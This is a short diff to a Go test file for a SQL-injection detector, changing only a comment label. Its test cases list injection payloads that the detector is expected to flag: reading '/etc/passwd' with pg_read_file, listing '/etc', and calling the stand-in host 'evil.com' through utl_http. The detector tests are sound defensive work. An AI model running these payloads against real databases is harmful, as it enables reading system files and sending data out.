@@ -48,7 +48,7 @@ func TestSQLiDetector_Detect(t *testing.T) {
 		{"pg_ls_dir", "SELECT pg_ls_dir('/etc')", true},
 		{"pg_read_file", "SELECT pg_read_file('/etc/passwd')", true},
 
-		// Oracle specific
+		// Database-specific
 		{"utl_http", "SELECT utl_http.request('http://evil.com')", true},
 		{"utl_file", "utl_file.put_line()", true},
 
